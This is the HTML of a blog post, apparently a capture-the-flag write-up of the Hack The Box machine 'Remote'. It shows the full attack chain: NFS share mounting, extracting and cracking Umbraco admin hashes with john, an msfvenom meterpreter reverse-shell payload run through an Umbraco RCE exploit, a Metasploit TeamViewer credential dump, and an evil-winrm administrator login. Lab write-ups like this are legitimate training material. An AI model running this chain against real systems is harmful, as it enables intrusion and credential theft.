@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title>Remote</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Remote</h1>
+            
+                <div class="post-meta">
+                    
+
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Hackthebox/">Hackthebox</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>#Remote</h3><p><img src="remote.png" alt="Sample Image"></p>
+
+<h3 id="information"><a href="#information" class="headerlink" title="information"></a>#cat information.remote </h3>
+<table>
+<thread>
+<tr>
+	<th>Info</th>
+	<th>Details</th>
+</tr>
+</thread>
+<tbody>
+	<tr>
+		<td>Name:</td>
+		<td>Magic</td>
+	</tr>
+	<tr>
+		<td>IP Address:</td>
+		<td>10.10.10.180</td>
+	</tr>
+	<tr>
+		<td>Points: </td>
+		<td>20</td>
+	</tr>
+	<tr>
+		<td>OS: </td>
+		<td>Window</td>
+	</tr>
+	<tr>
+		<td>Difficulty:</td>
+		<td>Easy</td>
+	</tr>
+	<tr>
+		<td>Machine Maker:</td>
+		<td><a href="https://www.hackthebox.eu/profile/2984">mrb3n</a></td>
+	</tr>
+</tbody>
+ </table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a># Nmap Scan</h3><pre><code class="bash">#cat remote.nmap
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|_  SYST: Windows_NT
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  mountd        1-3 (RPC #100005)
+Aggressive OS guesses: Novell NetWare 6 (98%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Novell NetWare 6.5 Open Enterprise Server (92%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (92%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 5m05s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-04-19T14:16:06
+|_  start_date: N/A
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   856.64 ms 10.10.16.1
+2   447.10 ms 10.10.10.180
+</code></pre>
+<h3 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>#NFS Service</h3><ul>
+<li><p>As Nmap result too many port are open , so let check some import port and services<br>I found one strange service this is mountd service , I don't know what is this , I search this in google , This is NFS(Network File System)Service</p>
+</li>
+<li><p>Check this NFS Service , I use showmount command to check 
+<code class="bash"><pre>#showmount -e 10.10.10.180
+/site_backups
+</code></pre>
+</li>
+<li><p>Try to get these site_backups</p></li>
+<pre><code class="bash">mount -t nfs 10.10.10.180:/site_backups /root/HTB/Machines/Remote/nfs/ </code></pre>
+<li>It may need to wait a few
+</li>
+</ul>
+<ul>
+<li><p>After , check this folder , can see some folder and files including config </p>
+</li>
+<li><p>umbraco.config and umbraco.sdf are interesting files, I analyze this 2 files<br></p>
+</li>
+<li><p>In This time , I found some administrator username , Email , Password Hash and Hash Algorithm of this password in umbraco.sdf file</p>
+<pre><code class="bash"># cat Umbraco.sdf | head 
+��V�t�t�y���Adb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d��׃rf�u�rf�v�rf���rf����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50��BiIf�hVg�v�rf�hVg����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f�[{"alias":"umbIntroIntroduction","completed":false,"disabled":true}]��?�g�.og���g����X�v�������smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e��?�g�Ag�.og�Og����Y�w�������ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749��~�
+g�)�
+g�.og�7�
+g����Z�x�������ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32��#��݇�0� A$C=H�DY^`FnyPH���I�� K��PM��
+�@`Cpr�G��PLUHUH�4�-`��II AEEqDD���|	5!
+��Eq
+Q�
+|p�!p�`@8��~!PI@
+|p�!p���~!PIEEqDD���|	5!
+��Eq
+Q�
+</code>
+</pre>
+I think this hash [b8be16afba8c314ad33d812f22a04991b90e2aaa] can be password
+I crack this hash with john
+</li>
+</ul>
+<pre><code class="bash"># john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hash
+john --show hash
+?:baconandcheese
+
+1 password hash cracked, 0 left
+</code></pre>
+Finally I got password
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>#Web</h3><ul>
+<li><p>As Nmap result too many port are open , so let check some import port and services<br>I found one strange service this is mountd service , I don't know what is this , I search this in google , This is NFS(Network File System)Service</p>
+<ul>
+<li><p>Nmap Result show port 80 is open , check this website 
+I found website this website is umbraco website and<br> I found umbraco config , admin email and password from NFS , Login with this admin email and password
+</p>
+</li>
+<li><p>I login with this email and password<br><img src="weblogin.png" alt="Smple Image"></p>
+</li>
+<li><p>It's work and login successful <br><img src="loginsuccess.png" alt="Sample Image"></p>
+</li>
+</ul>
+<h3 id="Trying-to-get-shell"><a href="#Trying-to-get-shell" class="headerlink" title="Trying to get shell"></a>#Trying to get shell</h3><ul>
+<li>I tried to get reverse shell</li>
+<li>We can upload file into server<br> This is Window Machine , I use msfvenom to create malicious file <img src="fileupload.png" alt="Sample Image"></li>
+<li><pre><code class="bash"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=port -f exe -o test.exe </code></pre>
+</li>
+<li>Upload this file .After upload successfully , use msfconsole to listening, 
+	<br>This umbraco cms has RCE Vulnerability <a href="https://github.com/noraj/Umbraco-RCE">Exploit here</a> 
+<br>This exploit is RCE and we can use this exploit to execute our uploaded malicious file to work in system
+<br><img src="msfconsole.png" alt="Sample Image"></li>
+<li>Malicious upload file is locate into the C:/inetpub/wwwroot/Media/1035/test.exe </li>
+<img src="exploitpath.png" alt="Sample Image">
+<li><p>Now I got one meterpreter shell</li></p>
+<pre><code class="bash">msf5 exploit(multi/hanlder)> run
+[*]Started reverse TCP handler on 10.10.17.191:4444
+[*]Sending Stage (180291 bytes) to 10.10.10.180
+[*]meterpreter session 1 opened (10.10.17.191:4444 -> 10.10.10.180:49708)
+meterpreter >
+</code></pre>
+<li><p>Finally I got user</p>
+</li>
+</ul>
+<h3 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>#Privileges Escalation</h3><ul>
+<li><p>After few minutes finding and enumeration I found one interesting , This is TeamViewer </p>
+<li><p>	I know I can dump credentials with one of metasploit post modules </p>
+<li><p>	I found teamviewer file in C:\Program Files (x86) </p>
+</li>
+<img src="teamviewer.png" alt="Sample Image">
+<li><p>I run metasploit post module teamviewer credential dumps</p>
+<li><p>Finally I got password ! </p>
+<pre><code class="bash">meterpreter > run post/windows/gather/credentials/teamviewer_passwords
+
+[*] Finding TeamViewer Passwords on REMOTE
+[+] Found Unattended Password: !R3m0te!
+</code></pre>
+<img src="dumpcre.png" alt="Sample Image">
+<li><p>I use evil-winrm to login with this password </p>
+</li>
+<pre><code class="bash">#ruby /opt/evil-winrm/evil-winrm.rb -u administrator -p '!R3m0te!' -i 10.10.10.180
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+d1c68**************************80a58ed
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+remote\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+</code></pre>
+<li><p>I successfully login as Administrator and get root.txt<br></p>
+</li>
+</ul>
+<p><b># Thank::</b></p>
+<p>$ <a href="https://www.hackthebox.eu//profile/2984">mrb3n</a> for creating this box</p>
+<p>$ You for reading</p>
+<p>Hope you learned something  :"( </p>
+        </div>
+
+            <section class="post-copyright">
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2019</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/"> # </a>
+            
+            
+            <a class="next" rel="next" href="/hackthebox/machines/Magic/"> Magic </a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© k3nx </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
